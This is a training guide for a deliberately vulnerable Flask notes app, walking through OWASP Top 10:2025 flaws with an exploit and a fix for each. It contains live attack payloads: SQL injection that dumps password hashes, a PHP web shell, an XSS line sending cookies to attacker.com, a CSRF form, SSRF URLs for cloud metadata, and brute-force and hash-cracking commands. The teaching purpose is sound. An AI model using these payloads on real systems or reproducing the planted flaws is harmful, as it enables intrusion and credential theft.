# OWASP Top 10:2025 Complete Security Review
## DevNotes - Intentionally Vulnerable Flask App

**⚠️ WARNING:** This application is **INTENTIONALLY VULNERABLE** for security training purposes only. Never deploy in production!

---

## Quick Start

```bash
# Run vulnerable app
docker compose up --build -d

# Access at http://localhost:5000
# Default credentials: admin / admin123
```

---

## OWASP Top 10:2025 Complete Coverage

### ✅ A01:2025 - Broken Access Control

**Severity:** CRITICAL
**Location:** `app.py:119`, `notes.py:10-19`

#### Vulnerability 1: Insecure Direct Object Reference (IDOR)

```python
@app.route("/notes/<int:note_id>")
def note_detail(note_id):
    user = get_user()
    if not user:
        return redirect(url_for("login"))
    # A01: No check that note belongs to current user
    note = notes_mod.get_note_by_id(note_id)
```

**Exploit:**
```bash
# Login as user1, create note (ID=1)
# Login as user2
# Visit http://localhost:5000/notes/1
# ❌ Can access user1's private note!
```

#### Vulnerability 2: Missing Function Level Access Control

```python
# notes.py
def get_note_by_id(note_id):
    # No user_id parameter, no ownership verification
    conn = db.get_conn()
    cur = conn.cursor()
    cur.execute("SELECT * FROM notes WHERE id = ?", (note_id,))
```

**Impact:**
- Horizontal privilege escalation (access other users' data)
- Data leakage
- Privacy violation

**Fix:**
```python
# notes.py
def get_note_by_id(note_id, user_id):
    conn = db.get_conn()
    cur = conn.cursor()
    cur.execute("SELECT * FROM notes WHERE id = ? AND user_id = ?", (note_id, user_id))
    # ...

# app.py
note = notes_mod.get_note_by_id(note_id, user["id"])
```

---

### ✅ A02:2025 - Security Misconfiguration

**Severity:** HIGH
**Location:** `app.py:16-19`

#### Vulnerability 1: Debug Mode Enabled

```python
app.config["DEBUG"] = True
```

**Exploit:**
```bash
# Trigger any error
# ❌ Full stack trace with source code exposed
# ❌ Werkzeug debugger console may be accessible
```

#### Vulnerability 2: Hardcoded Secret Key

```python
app.secret_key = "dev-secret-change-in-prod"  # A02: hardcoded secret
```

**Impact:**
- Session hijacking
- CSRF token prediction
- Cookie forgery

#### Vulnerability 3: No Security Headers

Missing headers:
- `X-Frame-Options`
- `X-Content-Type-Options`
- `Content-Security-Policy`
- `Strict-Transport-Security`

**Fix:**
```python
import os
import secrets

# Use environment variables
app.secret_key = os.environ.get("SECRET_KEY") or secrets.token_hex(32)
app.config["DEBUG"] = os.environ.get("DEBUG", "False").lower() == "true"

# Add security headers
@app.after_request
def set_security_headers(response):
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    return response

# Disable debug in production
if not app.config["DEBUG"]:
    @app.errorhandler(Exception)
    def handle_error(e):
        logging.error(f"Error: {str(e)}")
        return "An error occurred", 500
```

---

### ✅ A03:2025 - Software Supply Chain Failures

**Severity:** HIGH
**Location:** `requirements.txt:1-3`

#### Vulnerability: Outdated Dependencies with Known CVEs

```txt
# A03 Software Supply Chain Failures: intentionally old Flask with known CVEs
Flask==2.0.1
Werkzeug==2.0.1
requests==2.28.0
```

**Known Issues:**
- Flask 2.0.1 (released April 2021) - missing 3+ years of security patches
- Werkzeug 2.0.1 - has known vulnerabilities
- No dependency pinning for sub-dependencies
- No integrity checks (hashes)

**Detection:**
```bash
pip install pip-audit
pip-audit

# Output will show CVEs:
# - CVE-2023-XXXXX in Flask 2.0.1
# - CVE-2023-XXXXX in Werkzeug 2.0.1
```

**Impact:**
- Remote code execution (RCE)
- Denial of Service (DoS)
- Information disclosure
- Session hijacking

**Fix:**
```txt
# Use latest stable versions
Flask==3.0.0
Werkzeug==3.0.0
requests==2.31.0

# Pin sub-dependencies with hashes
--require-hashes
Flask==3.0.0 \
    --hash=sha256:XXX
```

**Best Practices:**
```bash
# Regular scanning
pip-audit --fix
safety check

# Automated updates
dependabot / renovate

# SBOM generation
pip-licenses --format=json > sbom.json
```

---

### ✅ A04:2025 - Cryptographic Failures

**Severity:** CRITICAL
**Location:** `auth.py:10-16`

#### Vulnerability 1: Weak Password Hashing (MD5)

```python
def hash_password(plain):
    return hashlib.md5(plain.encode()).hexdigest()
```

**Critical Issues:**
1. MD5 is cryptographically broken (since 1996!)
2. No salt - vulnerable to rainbow tables
3. Fast algorithm - brute force is trivial
4. No work factor - can hash millions per second

**Exploit:**
```bash
# Default admin password: admin123
# MD5 hash: 0192023a7bbd73250516f069df18b500

# Crack with hashcat (GPU)
hashcat -m 0 -a 0 hash.txt rockyou.txt
# Cracks in < 1 second

# Or use online MD5 databases
curl "https://md5decrypt.net/en/Api/api.php?hash=0192023a7bbd73250516f069df18b500"
# Returns: admin123
```

#### Vulnerability 2: No Password Policy

No requirements for:
- Minimum length
- Complexity
- Common password checking

**Impact:**
- Account takeover
- Credential stuffing
- Rainbow table attacks
- GPU-accelerated brute force

**Fix:**
```python
import bcrypt
import re

def hash_password(plain):
    # bcrypt: slow, adaptive, salted
    return bcrypt.hashpw(plain.encode(), bcrypt.gensalt()).decode()

def check_password(plain, stored_hash):
    return bcrypt.checkpw(plain.encode(), stored_hash.encode())

def validate_password_strength(password):
    if len(password) < 12:
        return False, "Password must be at least 12 characters"
    if not re.search(r'[A-Z]', password):
        return False, "Password must contain uppercase letter"
    if not re.search(r'[a-z]', password):
        return False, "Password must contain lowercase letter"
    if not re.search(r'[0-9]', password):
        return False, "Password must contain number"
    return True, ""
```

**Advanced Fix:**
```python
import argon2  # Even better than bcrypt

ph = argon2.PasswordHasher()

def hash_password(plain):
    return ph.hash(plain)

def check_password(plain, stored_hash):
    try:
        ph.verify(stored_hash, plain)
        return True
    except:
        return False
```

---

### ✅ A05:2025 - Injection

**Severity:** CRITICAL
**Location:** `notes.py:34-45`

#### Vulnerability: SQL Injection in Search

```python
def search_notes(q):
    conn = db.get_conn()
    cur = conn.cursor()
    # A05 Injection: concatenating user input into SQL
    query = f"SELECT * FROM notes WHERE title LIKE '%{q}%' OR body LIKE '%{q}%'"
    cur.execute(query)
```

**Exploit 1: Bypass Search Filter**
```sql
-- Search input:
test' OR '1'='1

-- Resulting query:
SELECT * FROM notes WHERE title LIKE '%test' OR '1'='1%' OR body LIKE '%test' OR '1'='1%'

-- Result: Returns ALL notes (authentication bypass)
```

**Exploit 2: Dump User Credentials**
```sql
-- Search input:
test' UNION SELECT id, username, password_hash, is_admin, '', '' FROM users--

-- Resulting query:
SELECT * FROM notes WHERE title LIKE '%test' UNION SELECT id, username, password_hash, is_admin, '', '' FROM users--%'

-- Result: Returns all usernames and MD5 password hashes
```

**Exploit 3: Database Structure Discovery**
```sql
-- Search input:
test' UNION SELECT sql, '', '', '', '', '' FROM sqlite_master WHERE type='table'--

-- Result: Dumps database schema
```

**Exploit 4: Blind SQL Injection**
```sql
-- Search input:
test' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (1/0) END)='1

-- Test for timing attacks:
test' AND (SELECT COUNT(*) FROM notes) > 5 AND sleep(5)--
```

**Impact:**
- Complete database compromise
- Authentication bypass
- Data exfiltration
- Privilege escalation
- Database modification/deletion

**Fix:**
```python
def search_notes(q):
    conn = db.get_conn()
    cur = conn.cursor()
    # Use parameterized queries
    query = "SELECT * FROM notes WHERE title LIKE ? OR body LIKE ?"
    pattern = f"%{q}%"
    cur.execute(query, (pattern, pattern))
    rows = cur.fetchall()
    # ...
```

**Defense in Depth:**
```python
import re

def search_notes(q, user_id):
    # Input validation
    if len(q) > 100:
        return []

    # Sanitize special chars (defense in depth)
    q = re.sub(r'[^\w\s]', '', q)

    # Use parameterized query
    conn = db.get_conn()
    cur = conn.cursor()
    query = """
        SELECT * FROM notes
        WHERE (title LIKE ? OR body LIKE ?)
        AND user_id = ?
    """
    pattern = f"%{q}%"
    cur.execute(query, (pattern, pattern, user_id))
    # ...
```

---

### ✅ A06:2025 - Insecure Design

**Severity:** MEDIUM
**Location:** `notes.py:48-60`

#### Vulnerability: Predictable Share Tokens

```python
def create_note(user_id, title, body):
    conn = db.get_conn()
    cur = conn.cursor()
    cur.execute(
        "INSERT INTO notes (user_id, title, body, share_token, created_at) VALUES (?, ?, ?, '', datetime('now'))",
        (user_id, title, body),
    )
    note_id = cur.lastrowid
    # A06 Insecure Design: share_token = str(note_id), predictable
    cur.execute("UPDATE notes SET share_token = ? WHERE id = ?", (str(note_id), note_id))
```

**Exploit:**
```bash
# Enumerate all shared notes
for i in {1..1000}; do
  curl http://localhost:5000/share/$i
done

# Find: /share/1, /share/2, /share/3, etc.
# ❌ Can access all shared notes via enumeration
```

**Design Flaws:**
1. Sequential IDs leak business information (note count)
2. No access revocation mechanism
3. No expiration dates
4. No access logging

**Impact:**
- Information disclosure
- Business intelligence leakage
- Privacy violation

**Fix:**
```python
import secrets

def create_note(user_id, title, body):
    conn = db.get_conn()
    cur = conn.cursor()

    # Generate cryptographically secure random token
    share_token = secrets.token_urlsafe(32)  # 256 bits of entropy

    cur.execute(
        "INSERT INTO notes (user_id, title, body, share_token, created_at) VALUES (?, ?, ?, ?, datetime('now'))",
        (user_id, title, body, share_token),
    )
    # ...
```

**Advanced Fix with Expiration:**
```python
def create_note(user_id, title, body, share_expires_days=30):
    import datetime

    share_token = secrets.token_urlsafe(32)
    expires_at = datetime.datetime.now() + datetime.timedelta(days=share_expires_days)

    cur.execute(
        """INSERT INTO notes
        (user_id, title, body, share_token, created_at, share_expires_at)
        VALUES (?, ?, ?, ?, datetime('now'), ?)""",
        (user_id, title, body, share_token, expires_at),
    )
```

---

### ✅ A07:2025 - Authentication Failures

**Severity:** HIGH
**Location:** `app.py:68-91`

#### Vulnerability 1: No Rate Limiting

```python
@app.route("/login", methods=["GET", "POST"])
def login():
    # A07: No rate limiting on login
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "")
        # ... authentication logic
```

**Exploit:**
```python
import requests

# Brute force attack - unlimited attempts
for password in common_passwords:
    r = requests.post('http://localhost:5000/login',
                     data={'username': 'admin', 'password': password})
    if 'Invalid' not in r.text:
        print(f"Password found: {password}")
        break

# No blocking, no CAPTCHA, no delay
```

#### Vulnerability 2: No Account Lockout

No protection against:
- Credential stuffing
- Password spraying
- Brute force attacks

#### Vulnerability 3: Weak Session Management

```python
@app.route("/logout")
def logout():
    # A07: Session not properly invalidated (only clear key, server-side session store not cleared)
    session.pop("user_id", None)
    return redirect(url_for("login"))
```

**Issues:**
- Session ID not regenerated on login
- No session timeout
- No concurrent session limits
- Session not invalidated server-side

**Impact:**
- Account takeover via brute force
- Credential stuffing attacks
- Session hijacking
- No protection against stolen sessions

**Fix:**
```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from datetime import timedelta

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"],
    storage_uri="redis://localhost:6379"
)

@app.route("/login", methods=["GET", "POST"])
@limiter.limit("5 per minute")  # Max 5 login attempts per minute
def login():
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "")

        # Check if account is locked
        if is_account_locked(username):
            flash("Account temporarily locked due to failed login attempts")
            return render_template("login.html")

        conn = db.get_conn()
        cur = conn.cursor()
        cur.execute("SELECT id, password_hash FROM users WHERE username = ?", (username,))
        row = cur.fetchone()
        conn.close()

        if row and auth.check_password(password, row[1]):
            # Clear failed attempts
            reset_failed_attempts(username)

            # Regenerate session ID (prevent fixation)
            session.clear()
            session['user_id'] = row[0]
            session.permanent = True
            app.permanent_session_lifetime = timedelta(minutes=30)

            logging.info(f"Successful login: {username} from {request.remote_addr}")
            return redirect(url_for("notes_list"))

        # Track failed attempt
        increment_failed_attempts(username)
        logging.warning(f"Failed login: {username} from {request.remote_addr}")
        flash("Invalid username or password")

    return render_template("login.html")

# Account lockout logic
def is_account_locked(username):
    # Lock after 5 failed attempts for 15 minutes
    pass

def increment_failed_attempts(username):
    pass

def reset_failed_attempts(username):
    pass
```

---

### ✅ A08:2025 - Software or Data Integrity Failures

**Severity:** HIGH
**Location:** `app.py:159-182`

#### Vulnerability 1: Unrestricted File Upload

```python
ALLOWED_EXTENSIONS = None  # intentionally allow all for demo

def allowed_file(filename):
    if ALLOWED_EXTENSIONS is None:
        return True
    return "." in filename and filename.rsplit(".", 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route("/upload", methods=["GET", "POST"])
def upload():
    # ...
    if f.filename:
        # A08: Arbitrary file upload; no type check, .py etc allowed
        filename = secure_filename(f.filename) or str(uuid.uuid4())
        path = os.path.join(app.config["UPLOAD_FOLDER"], filename)
        f.save(path)
```

**Exploit 1: Upload Malicious Python File**
```python
# Create evil.py
print("Malicious Python code")
import os
os.system("whoami")
os.system("cat /etc/passwd")

# Upload via /upload endpoint
# ❌ Accepted! Stored in uploads/evil.py
```

**Exploit 2: Upload Web Shell**
```php
<!-- evil.php -->
<?php system($_GET['cmd']); ?>

<!-- If PHP is enabled: -->
http://localhost:5000/uploads/evil.php?cmd=ls
```

**Exploit 3: Upload Executable**
```bash
# Upload malware.exe, trojan.sh, etc.
# No validation, no scanning
```

#### Vulnerability 2: No File Size Limits

```python
# Can upload multi-GB files
# Denial of Service via disk exhaustion
```

#### Vulnerability 3: No Content Verification

```python
# Filename says .jpg
# Content is actually .exe
# No magic number checking
```

**Impact:**
- Remote code execution
- Malware distribution
- Denial of Service
- Phishing attacks
- Data exfiltration

**Fix:**
```python
import magic  # python-magic
from pathlib import Path

ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif'}
ALLOWED_MIME_TYPES = {
    'image/png', 'image/jpeg', 'image/gif',
    'application/pdf', 'text/plain'
}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def validate_file_content(file_path):
    """Verify file content matches extension"""
    mime = magic.from_file(file_path, mime=True)
    return mime in ALLOWED_MIME_TYPES

@app.route("/upload", methods=["GET", "POST"])
def upload():
    user = get_user()
    if not user:
        return redirect(url_for("login"))

    note_id = request.form.get("note_id") or request.args.get("note_id")
    if request.method == "POST" and note_id:
        if "file" not in request.files:
            flash("No file selected")
            return redirect(url_for("upload") + "?note_id=" + str(note_id))

        f = request.files["file"]

        if not f.filename:
            flash("No file selected")
            return redirect(url_for("upload") + "?note_id=" + str(note_id))

        # Validate extension
        if not allowed_file(f.filename):
            flash("File type not allowed")
            return redirect(url_for("upload") + "?note_id=" + str(note_id))

        # Check file size
        f.seek(0, os.SEEK_END)
        size = f.tell()
        f.seek(0)

        if size > MAX_FILE_SIZE:
            flash("File too large (max 5MB)")
            return redirect(url_for("upload") + "?note_id=" + str(note_id))

        # Generate safe filename
        filename = f"{uuid.uuid4()}_{secure_filename(f.filename)}"
        path = os.path.join(app.config["UPLOAD_FOLDER"], filename)

        # Save temporarily
        f.save(path)

        # Validate content
        if not validate_file_content(path):
            os.remove(path)
            flash("File content does not match extension")
            return redirect(url_for("upload") + "?note_id=" + str(note_id))

        # Store in database
        conn = db.get_conn()
        cur = conn.cursor()
        cur.execute("INSERT INTO attachments (note_id, filename, path) VALUES (?, ?, ?)",
                   (note_id, f.filename, path))
        conn.commit()
        conn.close()

        flash("File uploaded successfully")
        return redirect(url_for("note_detail", note_id=note_id))

    return render_template("upload.html", user=user, note_id=note_id)
```

**Additional Protections:**
```python
# Virus scanning
import clamd
cd = clamd.ClamdUnixSocket()
scan_result = cd.scan(path)

# Store outside web root
UPLOAD_FOLDER = "/var/data/uploads"  # Not in /app/static

# Add integrity checks
import hashlib
file_hash = hashlib.sha256(file_content).hexdigest()
# Store hash in database for verification
```

---

### ✅ A09:2025 - Security Logging & Alerting Failures

**Severity:** MEDIUM
**Location:** Throughout application

#### Vulnerability: No Security Event Logging

**Missing Logs:**
1. Failed login attempts
2. Access control violations
3. Privilege escalations
4. Data exports
5. Configuration changes
6. Exception details

**Current Code:**
```python
@app.route("/login", methods=["GET", "POST"])
def login():
    # A09: No logging of failed logins
    if request.method == "POST":
        # ... auth logic
        if row and auth.check_password(password, row[1]):
            session["user_id"] = row[0]
            # No success log
            return redirect(url_for("notes_list"))
        # No failure log
        flash("Invalid username or password")
```

**Impact:**
- Cannot detect attacks
- No forensic evidence
- Cannot track unauthorized access
- No compliance audit trail
- Delayed incident response

**Fix:**
```python
import logging
from logging.handlers import RotatingFileHandler
import json
from datetime import datetime

# Configure security logging
security_logger = logging.getLogger('security')
security_logger.setLevel(logging.INFO)

# JSON format for SIEM integration
class JSONFormatter(logging.Formatter):
    def format(self, record):
        log_data = {
            'timestamp': datetime.utcnow().isoformat(),
            'level': record.levelname,
            'event': record.getMessage(),
            'module': record.module,
        }
        if hasattr(record, 'user'):
            log_data['user'] = record.user
        if hasattr(record, 'ip'):
            log_data['ip'] = record.ip
        return json.dumps(log_data)

handler = RotatingFileHandler('security.log', maxBytes=10000000, backupCount=5)
handler.setFormatter(JSONFormatter())
security_logger.addHandler(handler)

# Also log to console in development
console_handler = logging.StreamHandler()
console_handler.setFormatter(JSONFormatter())
security_logger.addHandler(console_handler)

# Log security events
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "")

        conn = db.get_conn()
        cur = conn.cursor()
        cur.execute("SELECT id, password_hash FROM users WHERE username = ?", (username,))
        row = cur.fetchone()
        conn.close()

        if row and auth.check_password(password, row[1]):
            session["user_id"] = row[0]

            # Log successful login
            security_logger.info(
                f"Successful login",
                extra={'user': username, 'ip': request.remote_addr}
            )

            return redirect(url_for("notes_list"))

        # Log failed login
        security_logger.warning(
            f"Failed login attempt",
            extra={'user': username, 'ip': request.remote_addr}
        )

        flash("Invalid username or password")

    return render_template("login.html")

# Log access control violations
@app.route("/notes/<int:note_id>")
def note_detail(note_id):
    user = get_user()
    if not user:
        return redirect(url_for("login"))

    note = notes_mod.get_note_by_id(note_id)

    if note and note['user_id'] != user['id']:
        # Log unauthorized access attempt
        security_logger.warning(
            f"Unauthorized access attempt to note {note_id}",
            extra={'user': user['username'], 'ip': request.remote_addr}
        )

    # ... rest

# Log admin actions
@app.route("/admin")
def admin_dashboard():
    user = get_user()
    if not user:
        return redirect(url_for("login"))

    if not user.get("is_admin"):
        security_logger.warning(
            f"Non-admin attempted to access admin dashboard",
            extra={'user': user['username'], 'ip': request.remote_addr}
        )
        flash("Admin only")
        return redirect(url_for("notes_list"))

    security_logger.info(
        f"Admin dashboard accessed",
        extra={'user': user['username'], 'ip': request.remote_addr}
    )

    # ... rest
```

**Monitoring & Alerting:**
```python
# Set up alerts for suspicious patterns
def check_for_attacks():
    """Analyze logs for attack patterns"""
    # Multiple failed logins from same IP
    # SQL injection patterns in search logs
    # Mass note access (scraping)
    # Admin access from unusual IPs
    pass

# Integration with SIEM
# - Send logs to Splunk, ELK, Datadog
# - Set up real-time alerts
# - Create dashboards for security metrics
```

---

### ✅ A10:2025 - Mishandling of Exceptional Conditions

**Severity:** MEDIUM
**Location:** `app.py:119-134`, `app.py:186-208`

#### Vulnerability 1: Exposing Error Details to Users

```python
@app.route("/notes/<int:note_id>")
def note_detail(note_id):
    user = get_user()
    if not user:
        return redirect(url_for("login"))
    try:
        note = notes_mod.get_note_by_id(note_id)
        if not note:
            flash("Note not found")
            return redirect(url_for("notes_list"))
        return render_template("note_detail.html", user=user, note=note)
    except Exception as e:
        # A10: Exposing internal errors to users
        flash(f"Error: {str(e)}")
        return redirect(url_for("notes_list"))
```

**Exploit:**
```bash
# Trigger database error
GET /notes/999999999999999999999

# Response:
Error: integer overflow

# Reveals:
- Database type (SQLite)
- Internal error messages
- System paths
```

#### Vulnerability 2: Unhandled Exceptions Crash App

```python
@app.route("/import", methods=["GET", "POST"])
def import_note():
    # ...
    if url:
        # A10: Poor exception handling - exposes stack traces and internal details
        import requests
        r = requests.get(url, timeout=5)  # No try/except - crashes on network errors
        r.raise_for_status()
```

**Exploit:**
```bash
# Invalid URL causes unhandled exception
POST /import
url=http://invalid-domain-12345.com

# With DEBUG=True:
# Full stack trace exposed:
Traceback (most recent call last):
  File "/app/app.py", line 197, in import_note
    r = requests.get(url, timeout=5)
  File "/usr/local/lib/python3.9/site-packages/requests/api.py", line 75, in get
    return request('get', url, params=params, **kwargs)
...
requests.exceptions.ConnectionError: HTTPConnectionPool(host='invalid-domain-12345.com', port=80): ...
```

#### Vulnerability 3: No Input Validation Causing Type Errors

```python
# No validation on note_id
# String input causes SQLite error
GET /notes/abc

# Type mismatch reveals internal details
```

**Impact:**
- Information disclosure (stack traces)
- System fingerprinting
- Denial of Service (crash app)
- Path disclosure
- Database details leaked

**Fix:**
```python
import logging

# Configure error logging
error_logger = logging.getLogger('errors')
error_handler = logging.FileHandler('errors.log')
error_logger.addHandler(error_handler)

# Generic error handler
@app.errorhandler(Exception)
def handle_exception(e):
    # Log full details internally
    error_logger.error(f"Exception: {str(e)}", exc_info=True)

    # Show generic message to user
    if app.config['DEBUG']:
        # Only in development
        raise e
    else:
        return render_template('error.html',
                             error_message="An unexpected error occurred"), 500

# Specific error handlers
@app.errorhandler(404)
def handle_404(e):
    return render_template('404.html'), 404

@app.errorhandler(500)
def handle_500(e):
    error_logger.error(f"500 error: {str(e)}", exc_info=True)
    return render_template('error.html'), 500

# Proper exception handling in routes
@app.route("/notes/<int:note_id>")
def note_detail(note_id):
    user = get_user()
    if not user:
        return redirect(url_for("login"))

    try:
        # Validate input
        if note_id < 1 or note_id > 999999:
            flash("Invalid note ID")
            return redirect(url_for("notes_list"))

        note = notes_mod.get_note_by_id(note_id)
        if not note:
            flash("Note not found")
            return redirect(url_for("notes_list"))

        return render_template("note_detail.html", user=user, note=note)

    except ValueError as e:
        error_logger.warning(f"Invalid note ID: {note_id}")
        flash("Invalid note ID")
        return redirect(url_for("notes_list"))

    except Exception as e:
        error_logger.error(f"Error loading note {note_id}: {str(e)}", exc_info=True)
        flash("An error occurred loading the note")
        return redirect(url_for("notes_list"))

# Import with proper error handling
@app.route("/import", methods=["GET", "POST"])
def import_note():
    user = get_user()
    if not user:
        return redirect(url_for("login"))

    if request.method == "POST":
        url = request.form.get("url", "").strip()

        if not url:
            flash("URL required")
            return render_template("import.html", user=user)

        try:
            import requests
            from urllib.parse import urlparse

            # Validate URL format
            parsed = urlparse(url)
            if not parsed.scheme in ['http', 'https']:
                flash("Only HTTP/HTTPS URLs allowed")
                return render_template("import.html", user=user)

            # Make request with timeout
            r = requests.get(url, timeout=5, allow_redirects=False)
            r.raise_for_status()

            title = "Imported: " + url[:50]
            body = r.text[:10000]
            note_id = notes_mod.create_note(user["id"], title, body)

            flash("Note imported successfully")
            return redirect(url_for("note_detail", note_id=note_id))

        except requests.exceptions.Timeout:
            error_logger.warning(f"Import timeout: {url}")
            flash("Request timed out")

        except requests.exceptions.ConnectionError:
            error_logger.warning(f"Import connection error: {url}")
            flash("Could not connect to URL")

        except requests.exceptions.HTTPError as e:
            error_logger.warning(f"Import HTTP error: {url} - {e}")
            flash("HTTP error occurred")

        except Exception as e:
            error_logger.error(f"Import failed: {url} - {str(e)}", exc_info=True)
            flash("Import failed")

    return render_template("import.html", user=user)
```

**Best Practices:**
```python
# Input validation
from cerberus import Validator

note_schema = {
    'title': {'type': 'string', 'maxlength': 200, 'required': True},
    'body': {'type': 'string', 'maxlength': 10000},
}

v = Validator(note_schema)
if not v.validate(request.form):
    return jsonify({'errors': v.errors}), 400

# Circuit breaker for external services
from pybreaker import CircuitBreaker

breaker = CircuitBreaker(fail_max=5, timeout_duration=60)

@breaker
def fetch_url(url):
    return requests.get(url, timeout=5)
```

---

## Bonus Vulnerabilities (Not in OWASP Top 10:2025)

### Cross-Site Scripting (XSS)

**Currently Protected:** Jinja2 auto-escapes by default

To add XSS vulnerability for training:
```html
<!-- templates/note_detail.html -->
<h1>{{ note.title | safe }}</h1>  <!-- VULNERABLE -->
<div>{{ note.body | safe }}</div>  <!-- VULNERABLE -->
```

**Exploit:**
```javascript
Title: <script>alert(document.cookie)</script>
Body: <img src=x onerror="fetch('http://attacker.com?cookie='+document.cookie)">
```

---

### Cross-Site Request Forgery (CSRF)

**Currently Vulnerable:** No CSRF tokens

**Exploit:**
```html
<!-- Attacker's website -->
<form action="http://localhost:5000/notes/create" method="POST">
  <input type="hidden" name="title" value="Pwned">
  <input type="hidden" name="body" value="You got hacked">
</form>
<script>document.forms[0].submit();</script>
```

**Fix:**
```python
from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)
```

---

### Server-Side Request Forgery (SSRF)

**Location:** `app.py:186-208` (import feature)

**Exploit:**
```
Import URL: http://169.254.169.254/latest/meta-data/
Import URL: http://localhost:5000/admin
Import URL: file:///etc/passwd
```

**Fix:** See A10 section above for URL validation

---

## Complete Testing Checklist

### A01: Broken Access Control
- [ ] Access other users' notes via IDOR
- [ ] Modify note_id in URL
- [ ] Access admin panel without admin role

### A02: Security Misconfiguration
- [ ] Trigger error to see stack trace
- [ ] Check for exposed debug endpoints
- [ ] Test for missing security headers

### A03: Software Supply Chain
- [ ] Run `pip-audit` to find CVEs
- [ ] Check for outdated dependencies
- [ ] Look for missing integrity checks

### A04: Cryptographic Failures
- [ ] Crack MD5 password hashes
- [ ] Test weak passwords
- [ ] Check for plain text storage

### A05: Injection
- [ ] SQL injection in search
- [ ] Test UNION queries
- [ ] Bypass authentication with SQL

### A06: Insecure Design
- [ ] Enumerate share tokens
- [ ] Predict note IDs
- [ ] Test for business logic flaws

### A07: Authentication Failures
- [ ] Brute force login (no rate limit)
- [ ] Session fixation
- [ ] Test logout doesn't invalidate session

### A08: Software/Data Integrity
- [ ] Upload .py, .exe, .sh files
- [ ] Upload huge files (DoS)
- [ ] Upload malware

### A09: Logging Failures
- [ ] Check if failed logins are logged
- [ ] Verify no audit trail exists
- [ ] Test for missing security events

### A10: Exception Handling
- [ ] Trigger errors to see details
- [ ] Test invalid inputs
- [ ] Crash app with bad data

---

## Quick Demo Script

```bash
# 1. Start app
docker compose up --build -d

# 2. Register users
# User1: alice / password123
# User2: bob / password123

# 3. Demo A01 - IDOR
# Login as alice, create note (ID=1)
# Login as bob
# Visit http://localhost:5000/notes/1
# ❌ Can see alice's note!

# 4. Demo A05 - SQL Injection
# Search for: test' OR '1'='1
# ❌ Returns all notes

# 5. Demo A04 - Weak Crypto
echo -n "password123" | md5
# Look up hash online
# ❌ Instantly cracked

# 6. Demo A08 - File Upload
# Upload evil.py with malicious code
# ❌ Accepted!

# 7. Demo A10 - Exception Handling
# Visit http://localhost:5000/notes/99999999999999999
# ❌ Stack trace exposed
```

---

## Resources

- [OWASP Top 10:2025](https://owasp.org/www-project-top-ten/)
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
